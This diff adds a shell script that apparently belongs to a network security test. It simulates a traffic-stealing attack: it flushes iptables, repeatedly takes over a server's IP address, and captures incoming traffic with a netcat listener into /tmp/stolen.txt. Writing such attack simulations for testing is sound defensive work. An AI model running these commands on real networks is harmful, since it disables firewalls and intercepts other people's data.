@@ -1,0 +1,23 @@
+# SPDX-FileCopyrightText: 2022-2024 Technology Innovation Institute (TII)
+# SPDX-License-Identifier: Apache-2.0
+
+# These will be automatically written to the file when running the test
+# ip_server=
+# ip_stealer=
+
+sudo iptables -F
+
+echo "" > /tmp/stolen.txt
+
+for i in {1..30}
+do
+  echo "" >> /tmp/stolen.txt
+  echo "iteration $i - $(date)" >> /tmp/stolen.txt
+  sudo ifconfig ethint0 ${ip_server} netmask 255.255.255.0 up
+  sleep 0.3
+  sudo ifconfig ethint0 ${ip_server} netmask 255.255.255.0 up
+  sleep 0.3
+  timeout 1 nc -l 5201 >> /tmp/stolen.txt 2>&1
+  sudo ifconfig ethint0 ${ip_stealer} netmask 255.255.255.0 up
+  sleep 0.3
+done
